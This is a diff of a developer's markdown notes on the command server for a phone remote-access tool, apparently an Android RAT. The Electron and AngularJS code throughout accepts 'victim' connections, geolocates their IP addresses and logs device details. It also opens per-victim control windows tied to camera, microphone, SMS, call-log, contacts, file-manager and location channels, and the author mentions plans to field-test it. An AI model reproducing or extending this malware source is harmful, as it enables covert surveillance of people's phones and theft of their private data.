@@ -1,86 +1,221 @@
-## Code for Disconnect function
-> Once this is done it will alow users to disconnect their own victim connections via the click of a `Disconnect` button
-- AppCtrl.js
-```javascript
-    // when user clicks Disconnect Button
-    $appCtrl.Stop = (port) => {
-      if (!port) {
-        port = CONSTANTS.defaultPort;
-      }
-      
-      //notify the main process to disconnect the port
-      ipcRenderer.send('SocketIO:StopListen', port);
-      $appCtrl.Log("Stopped Listening on Port: " + port, CONSTANTS.logStatus.SUCCESS);
-    }
+## Code for Disconnect/Stop function
+> Seems to be doing what I want it to, just need to tweak somethings first, then feild test it.
+- Index.html
+```html
+<button ng-click="clearLogs(); isListen=true;Listen(port)" class="ui labeled icon black button"><i class="terminal icon"></i>Listen</button>
+<button ng-click="clearLogs(); StopListening(port)" class="ui labeled icon black button"><i class="terminal icon"></i>Stop</button>
+```
 
-    //fired when main process sends any notification about the ServerDisconnect 
-    ipcRenderer.on('SocketIO:ServerDisconnect', (event, index) => {
-      delete viclist[index];
-      $appCtrl.$apply();
+- main.js (Main Process)
+```javascript
+let isListening = false;
+
+ipcMain.on('SocketIO:Listen', function (event, port) {
+  if (isListening) {
+    event.reply('SocketIO:Listen', '[x] Already Listening on Port ' + port, CONSTANTS.logStatus.FAIL);
+    return;
+  }
+
+  IO = io.listen(port);
+  IO.sockets.pingInterval = 10000;
+  IO.sockets.on('connection', function (socket) {
+    // Get victim info
+    var address = socket.request.connection;
+    var query = socket.handshake.query;
+    var index = query.id;
+    var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
+    var country = null;
+    var geo = geoip.lookup(ip); // check ip location
+    if (geo)
+      country = geo.country.toLowerCase();
+
+    // Add the victim to victimList
+    victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);
+
+
+    //------------------------Notification SCREEN INIT------------------------------------
+    // create the Notification window
+    let notification = new BrowserWindow({
+      frame: false,
+      x: display.bounds.width - 280,
+      y: display.bounds.height - 78,
+      show: false,
+      width: 280,
+      height: 78,
+      resizable: false,
+      toolbar: false,
+      webPreferences: {
+        nodeIntegration: true,
+        enableRemoteModule: true
+      }
     });
 
-    // fired if stopping the listener brings error
-    ipcRenderer.on("SocketIO:StopListen", (event, error) => {
-      $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
-      $appCtrl.$apply()
-  });
+    // Emitted when the window is finished loading.
+    notification.webContents.on('did-finish-load', function () {
+      notification.show();
+      setTimeout(function () { notification.destroy() }, 3000);
+    });
 
-    //notify the main process to close the lab
-    $appCtrl.closeLab = (index) => {
-      ipcRenderer.send('closeLabWindow', 'lab.html', index)
-    }
-```
-- main.js
-```javascript 
-// fired when stopped listening for victim
-ipcMain.on("SocketIO:StopListen", function (event, port) {
+    notification.webContents.victim = victimsList.getVictim(index);
+    notification.loadFile(__dirname + '/app/notification.html');
 
-  IO.close();
-  IO.sockets.on('connection', function (socket) {
-    // decrease socket count on Disconnect
+
+
+    //notify renderer proccess (AppCtrl) about the new Victim
+    win.webContents.send('SocketIO:NewVictim', index);
+
     socket.on('disconnect', function () {
-      victimList.rmVictim(index)
+      // Decrease the socket count on a disconnect
+      victimsList.rmVictim(index);
 
-      // notify the renderer process about the Server Disconnection
-      win.webContents.send('SocketIO:ServerDisconnect', index);
+      //notify renderer proccess (AppCtrl) about the disconnected Victim
+      win.webContents.send('SocketIO:RemoveVictim', index);
 
       if (windows[index]) {
-        // notify the renderer process about the Disconnected Server
-        windows[index].webContents.send('SocketIO:ServerDisconnected', index);
-        // delete the windows from the windowList
-        delete windows[index];
+        //notify renderer proccess (LabCtrl) if opened about the disconnected Victim
+        BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
+        //delete the window from windowsList
+        delete windows[index]
+      }
+
+      if (windows[index]) {
+        BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:ServerDisconnected");
+        delete windows[index]
       }
     });
+
   });
+
+  event.reply('SocketIO:Listen', '[✓] Started Listening on Port: ' + port, CONSTANTS.logStatus.SUCCESS);
+  isListening = true;
+
 });
 
-
-ipcMain.on("closeLabWindow", function (event, index) {
-  delete windows[index];
-  //on lab window closed remove all socket listners
-  if (victimsList.getVictim(index).socket) {
-    victimsList.getVictim(index).socket.removeAllListeners("x0000ca"); // camera
-    victimsList.getVictim(index).socket.removeAllListeners("x0000fm"); // file manager
-    victimsList.getVictim(index).socket.removeAllListeners("x0000sm"); // sms
-    victimsList.getVictim(index).socket.removeAllListeners("x0000cl"); // call logs
-    victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
-    victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
-    victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
+// fired when the stop button is clicked
+ipcMain.on('SocketIO:Stop', function (event, port) {
+  if (IO) {
+      IO.close();
+      IO = null;
+      event.reply('SocketIO:Stop', '[✓] Stopped listening on Port: ' + port, CONSTANTS.logStatus.SUCCESS);
+      isListening = false;
+  } else {
+      event.reply('SocketIO:Stop', '[x] The Server is not Currently Listening', CONSTANTS.logStatus.FAIL);
   }
 });
 
-//handle the Uncaught Exceptions
 process.on('uncaughtException', function (error) {
-
-  if (error.code == "EADDRINUSE" || error.code == "ENOTCONN") {
-    win.webContents.send('SocketIO:Listen', "Address Already in Use");
+  if (error.code == "EADDRINUSE") {
+      win.webContents.send('SocketIO:ListenError', "[x] Address Already in Use", CONSTANTS.logStatus.FAIL);
   } else {
-    win.webContents.send('SocketIO:StopListen', "Server is not Listening");
-  } // end of if
+      electron.dialog.showErrorBox("ERROR", JSON.stringify(error));
+  }
+});
 
+
+
+// Fired when Victim's Lab is opened
+ipcMain.on('openLabWindow', function (e, page, index) {
+  //------------------------Lab SCREEN INIT------------------------------------
+  // create the Lab window
+  let child = new BrowserWindow({
+    icon: __dirname + '/app/assets/img/icon.png',
+    parent: win,
+    width: 700,
+    height: 750,
+    show: false,
+    darkTheme: true,
+    transparent: true,
+    resizable: false,
+    frame: false,
+    webPreferences: {
+      nodeIntegration: true,
+      enableRemoteModule: true
+    }
+  })
+
+  //add this window to windowsList
+  windows[index] = child.id;
+  //child.webContents.openDevTools();
+
+  // pass the victim info to this victim lab
+  child.webContents.victim = victimsList.getVictim(index).socket;
+  child.loadFile(__dirname + '/app/' + page)
+
+  child.once('ready-to-show', () => {
+    child.show();
+  });
+
+  child.on('closed', () => {
+    delete windows[index];
+    //on lab window closed remove all socket listners
+    if (victimsList.getVictim(index).socket) {
+      victimsList.getVictim(index).socket.removeAllListeners("x0000ca"); // camera
+      victimsList.getVictim(index).socket.removeAllListeners("x0000fm"); // file manager
+      victimsList.getVictim(index).socket.removeAllListeners("x0000sm"); // sms
+      victimsList.getVictim(index).socket.removeAllListeners("x0000cl"); // call logs
+      victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
+      victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
+      victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
+    }
+  })
 });
 ```
-- index.html
-```html
-<button ng-click="isListen=false;Stop(port);" class="ui labeled icon black button"><i class="terminal icon" ></i>Stop</button>
+
+- AppCtrl.js (Render Process)
+```javascript
+  $appCtrl.Listen = (port) => {
+    if (!port) {
+      port = CONSTANTS.defaultPort;
+    }
+
+    ipcRenderer.send("SocketIO:Listen", port);
+  };
+
+  $appCtrl.StopListening = (port) => {
+    if (!port) {
+      port = CONSTANTS.defaultPort;
+    }
+
+    ipcRenderer.send("SocketIO:Stop", port);
+  };
+
+  ipcRenderer.on("SocketIO:Listen", (event, message) => {
+    $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
+    $appCtrl.isListen = true;
+    $appCtrl.$apply();
+  });
+
+  ipcRenderer.on("SocketIO:Stop", (event, message) => {
+    $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
+    $appCtrl.isListen = false;
+    $appCtrl.$apply();
+  });
+
+  ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
+    viclist[index] = victimsList.getVictim(index);
+    $appCtrl.Log('[¡] New victim from ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
+    $appCtrl.$apply();
+  });
+
+  ipcRenderer.on("SocketIO:ListenError", (event, error) => {
+    $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
+    $appCtrl.isListen = false;
+    $appCtrl.$apply();
+  });
+
+  ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
+    $appCtrl.Log('[¡] Victim Disconnected ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
+    delete viclist[index];
+    $appCtrl.$apply();
+  });
+
+  $appCtrl.openLab = (index) => {
+    ipcRenderer.send('openLabWindow', 'lab.html', index);
+  };
+```
+- LabCtrl.js (Render Process)
+```javascript
+ipcRenderer.on('SocketIO:ServerDisconnected', (event) => {
+    $rootScope.Log('[¡] Server Disconnected', CONSTANTS.logStatus.FAIL);
+});
 ```
